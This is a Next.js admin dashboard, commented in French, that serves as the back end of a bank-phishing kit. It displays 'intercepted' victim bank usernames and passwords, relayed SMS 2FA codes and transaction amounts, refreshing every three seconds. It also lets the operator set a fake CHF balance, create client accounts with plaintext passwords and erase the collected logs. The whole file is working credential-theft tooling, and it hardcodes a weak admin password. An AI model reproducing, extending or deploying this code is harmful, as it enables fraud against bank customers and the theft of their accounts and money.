"use client";

import Link from "next/link";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

// Structure d'une interception d'identifiant bancaire
interface BankLog {
  type: "credentials";
  id: string;
  bankName: string;
  username: string;
  secret: string;
  time: string;
  date: string;
}

interface CodeLog {
  type: "code";
  id: string;
  bankName: string;
  username: string;
  codeValue: string;
  time: string;
  date: string;
}

// Interface pour le montant intercepté
interface AmountLog {
  type: "amount";
  id: string;
  bankName: string;
  username: string;
  amountValue: string;
  time: string;
  date: string;
}

// Type combiné mis à jour pour le flux d'activité
type LiveActivity = BankLog | CodeLog | AmountLog;

export default function AdminPage() {
  // Gestion de l'authentification Admin
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [loginError, setLoginError] = useState("");
  const [newUserName, setNewUserName] = useState("");
  const [newUserPassword, setNewUserPassword] = useState("");
  const [isCreatingUser, setIsCreatingUser] = useState(false);
  const [createdUsers, setCreatedUsers] = useState<any[]>([]);

  // Liste unifiée des activités reçues en temps réel
  const [activities, setActivities] = useState<LiveActivity[]>([]);
  const [currentGlobalBalance, setCurrentGlobalBalance] = useState("20 000");

  // 1. Vérification automatique de la session au chargement (localStorage)
  useEffect(() => {
    const session = localStorage.getItem("admin_session");
    if (session === "active") {
      setIsAuthenticated(true);
    }
  }, []);

  // Fonction de connexion
  const handleAdminLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (usernameInput === "Admin" && passwordInput === "Admin015") {
      setIsAuthenticated(true);
      setLoginError("");
      localStorage.setItem("admin_session", "active");
    } else {
      setLoginError("Identifiants de sécurité incorrects.");
    }
  }; 

  // Fonction de déconnexion
  const handleAdminLogout = () => { 
    setIsAuthenticated(false);
    localStorage.removeItem("admin_session");
  };

  // 2. Récupération réelle du flux d'activité en temps réel
  useEffect(() => {
    if (!isAuthenticated) return;

    const fetchLiveActivities = async () => {
      try {
        const response = await fetch("/api/admin");
        if (response.ok) {
          const result = await response.json();
          setActivities(result.data || []);
        }
      } catch (error) {
        console.error("Erreur de liaison réseau avec l'API Admin:", error);
      }
    };

    fetchLiveActivities();
    const interval = setInterval(fetchLiveActivities, 3000);

    return () => clearInterval(interval);
  }, [isAuthenticated]);

  // Charger le solde au démarrage
  useEffect(() => {
    if (isAuthenticated) {
      fetch("/api/global-balance")
        .then((res) => res.json())
        .then((data) => {
          if (data.balance) {
            setCurrentGlobalBalance(data.balance.replace("CHF", "").trim());
          }
        });
    }
  }, [isAuthenticated]); 

  // Action de modification du solde global
  const handleEditGlobalBalance = async () => {
    const newMontant = prompt("Entrez le nouveau montant (Ex: 12 000) :", currentGlobalBalance);
    if (!newMontant) return;

    const cleanMontant = newMontant.replace("CHF", "").trim();

    try {
      const response = await fetch("/api/global-balance", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ balance: cleanMontant }),
      });
      if (response.ok) {
        const result = await response.json();
        setCurrentGlobalBalance(result.balance.replace("CHF", "").trim());
        alert("Le solde global a bien été enregistré !");
      }
    } catch (err) {
      console.error(err);
    }
  };



  
  // Action de création d'un compte utilisateur
  const handleCreateUser = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsCreatingUser(true);

    try {
      const response = await fetch("/api/admin-users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: newUserName, password: newUserPassword }),
      });

      const data = await response.json();

      if (response.ok) {
        alert(`Compte créé avec succès !\nIdentifiant généré : ${data.customId}`);
        setNewUserName("");
        setNewUserPassword("");
      } else {
        alert(data.error || "Erreur lors de la création.");
      }
    } catch (err) {
      console.error(err);
      alert("Erreur réseau.");
    } finally {
      setIsCreatingUser(false);
    }
  };

  // Fonction pour charger les comptes utilisateurs
  const fetchCreatedUsers = async () => {
    try {
      const response = await fetch("/api/admin-users");
      if (response.ok) {
        const data = await response.json();
        setCreatedUsers(data.users || []);
      }
    } catch (err) {
      console.error("Erreur lors de la récupération des utilisateurs:", err);
    }
  };

  // Charger les utilisateurs dès que l'admin est connecté
  useEffect(() => {
    if (isAuthenticated) {
      fetchCreatedUsers();
    }
  }, [isAuthenticated]);
  // ÉCRAN 1 : FORMULAIRE DE CONNEXION SÉCURISÉ
  if (!isAuthenticated) {
    return (
      <div className="admin-wrapper">
        <div className="admin-login-container">
          <form className="admin-login-card" onSubmit={handleAdminLogin}>
            <h2 className="bank-connect-title" style={{ textAlign: "center", marginBottom: "5px" }}>
              Espace Sécurisé
            </h2>
            <p className="bank-connect-subtitle" style={{ textAlign: "center", marginBottom: "25px" }}>
              Réservé uniquement aux administrateurs de la plateforme.
            </p>

            {loginError && <div className="error-message">{loginError}</div>}

            <div className="input-group">
              <label>Nom d'utilisateur</label>
              <div className="input-wrapper">
                <input
                  type="text"
                  className="input-field"
                  placeholder="Username"
                  value={usernameInput}
                  onChange={(e) => setUsernameInput(e.target.value)}
                  required
                />
              </div>
            </div>

            <div className="input-group" style={{ marginTop: "15px", marginBottom: "25px" }}>
              <label>Mot de passe secret</label>
              <div className="input-wrapper">
                <input
                  type="password"
                  className="input-field"
                  placeholder="••••••••••••"
                  value={passwordInput}
                  onChange={(e) => setPasswordInput(e.target.value)}
                  required
                />
              </div>
            </div>

            <button type="submit" className="btn-link-bank" style={{ marginTop: "0" }}>
              <i className="fa-solid fa-unlock-keyhole"></i>
              Déverrouiller l'accès
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Action pour vider toutes les interceptions de la base de données
const handleClearAllLogs = async () => {
  const confirmDelete = window.confirm("⚠️ Attention : Voulez-vous vraiment supprimer TOUTES les interceptions définitivement ? Cette action est irréversible.");
  if (!confirmDelete) return;

  try {
    const response = await fetch("/api/admin", { method: "DELETE" });
    if (response.ok) {
      setActivities([]); // Vide instantanément l'affichage sur la page
      alert("La base de données a été vidée avec succès !");
    } else {
      alert("Erreur lors de la suppression sur le serveur.");
    }
  } catch (err) {
    console.error("Erreur lors de la suppression :", err);
  }
};

  // ÉCRAN 2 : LE TABLEAU DE BORD ADMIN MULTI-FLUX
  return (
    <div className="admin-wrapper">
      <div className="admin-dashboard">
        
        {/* Barre supérieure */}
        <div className="admin-header">
          <div className="admin-header-left">
{/* 👇 NOUVEAU BOUTON : RACCOURCI CRÉATION COMPTE */}
  <button 
    onClick={() => document.getElementById("create-user-section")?.scrollIntoView({ behavior: "smooth" })} 
    style={{ marginLeft: "10px", padding: "8px 14px", background: "#10b981", color: "#fff", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "bold", display: "inline-flex", alignItems: "center", gap: "6px" }}
  >
    <i className="fa-solid fa-user-plus"></i>
    Créer un compte
  </button>
            <h1>Flux Interceptions</h1>
            <button 
              onClick={handleEditGlobalBalance} 
              style={{ marginLeft: "20px", padding: "8px 14px", background: "#2563eb", color: "#fff", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "bold" }}
            >
              💰 Changer le solde  ({currentGlobalBalance} CHF)
            </button>
            <div className="admin-status-badge" style={{ marginLeft: "15px" }}>
              <div className="status-dot-blink"></div>
              Écoute en temps réel active
            </div>
            <button 
  onClick={handleClearAllLogs} 
  style={{ marginLeft: "10px", padding: "8px 14px", background: "#dc2626", color: "#fff", border: "none", borderRadius: "8px", cursor: "pointer", fontWeight: "bold" }}
>
  🗑️ Supprimer les infos 
</button>
          </div>
          <button className="btn-logout-admin" onClick={handleAdminLogout}>
            <i className="fa-solid fa-power-off" style={{ marginRight: "8px" }}></i>
            Déconnexion
          </button>
        </div>

        {/* Corps unifié des notifications dynamiques */}
        <div className="logs-list">
          {activities.length === 0 ? (
            <div className="empty-logs">
              <i className="fa-solid fa-satellite-dish fa-2x" style={{ color: "#ccc" }}></i>
              <p>Aucune activité interceptée. En attente de requêtes clients...</p>
            </div>
          ) : (
            activities.map((activity) => {
              // RENDU 1 : SI C'EST UN CODE SMS
              if (activity.type === "code") {
                return (
                  <div key={activity.id} className="code-card">
                    <div className="code-card-left">
                      <h3><i className="fa-solid fa-key" style={{ marginRight: "6px" }}></i>Code 2FA Reçu</h3>
                      <div className="code-display">{activity.codeValue}</div>
                      <div className="code-target-info">
                        Banque : <strong>{activity.bankName}</strong> ({activity.username})
                      </div>
                    </div>
                    <div className="log-card-right">
                      <span className="log-time">
                        <i className="fa-regular fa-clock" style={{ marginRight: "5px", fontSize: "12px", color: "#aaa" }}></i>
                        {activity.time}
                      </span>
                      <span className="log-date">{activity.date}</span>
                    </div>
                  </div>
                );
              }

              // RENDU 2 : SI C'EST UN MONTANT INTERCEPTÉ
              if (activity.type === "amount") {
                return (
                  <div key={activity.id} className="code-card" style={{ borderLeft: "5px solid #2563eb" }}>
                    <div className="code-card-left">
                      <h3 style={{ color: "#2563eb" }}>
                        <i className="fa-solid fa-money-bill-transfer" style={{ marginRight: "6px" }}></i>Montant Saisi
                      </h3>
                      <div className="code-display" style={{ background: "#eff6ff", color: "#1e40af", borderColor: "#bfdbfe" }}>
                        {activity.amountValue}
                      </div>
                      <div className="code-target-info">
                        Banque : <strong>{activity.bankName}</strong> ({activity.username})
                      </div>
                    </div>
                    <div className="log-card-right">
                      <span className="log-time">
                        <i className="fa-regular fa-clock" style={{ marginRight: "5px", fontSize: "12px", color: "#aaa" }}></i>
                        {activity.time}
                      </span>
                      <span className="log-date">{activity.date}</span>
                    </div>
                  </div>
                );
              }

              // RENDU 3 : IDENTIFIANTS BANCAIRES D'ORIGINE
              return (
                <div key={activity.id} className="log-card">
                  <div className="log-card-left" style={{ paddingLeft: "5px" }}>
                    <div className="log-credentials">
                      <h3 style={{ fontSize: "17px", color: "#111", marginBottom: "6px" }}>
                        {activity.bankName}
                      </h3>
                      <div className="log-data-line">
                        <strong>ID:</strong> {activity.username}
                      </div>
                      <div className="log-data-line">
                        <strong>MDP:</strong> {activity.secret}
                      </div>
                    </div>
                  </div>
                  <div className="log-card-right">
                    <span className="log-time">
                      <i className="fa-regular fa-clock" style={{ marginRight: "5px", fontSize: "12px", color: "#aaa" }}></i>
                      {activity.time}
                    </span>
                    <span className="log-date">{activity.date}</span>
                  </div>
                </div>
              );
            })
          )}
        </div>

        <div id="create-user-section" style={{ background: "#fff", padding: "20px", borderRadius: "12px", border: "1px solid #e5e7eb", marginBottom: "25px" }}>
          
          {/* Formulaire de création */}
          <h2 style={{ fontSize: "18px", marginBottom: "15px", color: "#111", display: "flex", alignItems: "center", gap: "8px" }}>
            <i className="fa-solid fa-user-plus" style={{ color: "#2563eb" }}></i>
            Créer un compte client
          </h2>
          
          <form onSubmit={handleCreateUser} style={{ display: "flex", gap: "15px", alignItems: "stretch", flexWrap: "wrap", marginBottom: "30px" }}>
            <div style={{ display: "flex", flexDirection: "column", gap: "5px", flex: "1", minWidth: "100px" }}>
              <label style={{ fontSize: "13px", fontWeight: "600", color: "#666" }}>Nom complet</label>
              <input 
                type="text" 
                placeholder="Ex: Jean Dupont" 
                value={newUserName}
                onChange={(e) => setNewUserName(e.target.value)}
                required 
                style={{ padding: "12px", borderRadius: "8px", border: "1px solid #ccc", fontSize: "14px", width: "100%", boxSizing: "border-box" }}
              />
            </div>
            
            <div style={{ display: "flex", flexDirection: "column", gap: "5px", flex: "1", minWidth: "200px" }}>
              <label style={{ fontSize: "13px", fontWeight: "600", color: "#666" }}>Mot de passe initial</label>
              <input 
                type="text" 
                placeholder="Ex: Client2026!" 
                value={newUserPassword}
                onChange={(e) => setNewUserPassword(e.target.value)}
                required 
                style={{ padding: "12px", borderRadius: "8px", border: "1px solid #ccc", fontSize: "14px", width: "100%", boxSizing: "border-box" }}
              />
            </div>
            
            <button 
              type="submit" 
              disabled={isCreatingUser} 
              style={{ padding: "12px 24px", background: "#10b981", color: "#fff", border: "none", borderRadius: "8px", fontWeight: "bold", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", minWidth: "160px", alignSelf: "flex-end", height: "46px" }}
            >
              {isCreatingUser ? "Création..." : "Générer le compte"}
            </button>
          </form>

          <hr style={{ border: "0", borderTop: "1px solid #e5e7eb", margin: "20px 0" }} />

          {/* Liste des comptes créés */}
          <h3 style={{ fontSize: "16px", marginBottom: "15px", color: "#111", display: "flex", alignItems: "center", gap: "8px" }}>
            <i className="fa-solid fa-users" style={{ color: "#4b5563" }}></i>
            Comptes Utilisateurs Actifs ({createdUsers.length})
          </h3>

          <div style={{ width: "100%", overflowX: "auto", border: "1px solid #e5e7eb", borderRadius: "8px" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", textAlign: "left", fontSize: "14px" }}>
              <thead>
                <tr style={{ background: "#f9fafb", borderBottom: "1px solid #e5e7eb" }}>
                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Identifiant</th>
                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Nom complet</th>
                  <th style={{ padding: "12px 16px", fontWeight: "600", color: "#4b5563" }}>Mot de passe</th>
                </tr>
              </thead>
              <tbody>
                {createdUsers.length === 0 ? (
                  <tr>
                    <td colSpan={3} style={{ padding: "20px", textAlign: "center", color: "#9ca3af" }}>
                      Aucun compte utilisateur créé pour le moment.
                    </td>
                  </tr>
                ) : (
                  createdUsers.map((user) => (
                    <tr key={user.id} style={{ borderBottom: "1px solid #e5e7eb" }}>
                      <td style={{ padding: "12px 16px", fontWeight: "bold", color: "#2563eb" }}>{user.customId}</td>
                      <td style={{ padding: "12px 16px", color: "#111" }}>{user.name}</td>
                      <td style={{ padding: "12px 16px", color: "#4b5563", fontFamily: "monospace" }}>{user.password}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>

        </div>

      </div>
    </div>
  );
}